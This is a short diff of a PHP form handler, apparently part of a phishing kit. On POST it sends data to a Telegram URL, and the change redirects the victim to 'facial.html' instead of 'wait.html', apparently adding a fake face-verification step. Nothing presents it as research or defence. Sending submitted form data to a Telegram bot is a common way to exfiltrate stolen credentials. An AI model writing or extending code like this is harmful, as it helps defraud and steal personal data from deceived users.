@@ -69,10 +69,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     @file_get_contents($urlTelegram, false, $context);
 
     // Redirigir a wait.html
-    header('Location: wait.html');
+    header('Location: facial.html');
     exit;
 } else {
     header('HTTP/1.0 403 Forbidden');
     echo "Acceso no permitido.";
 }
 ?>
+
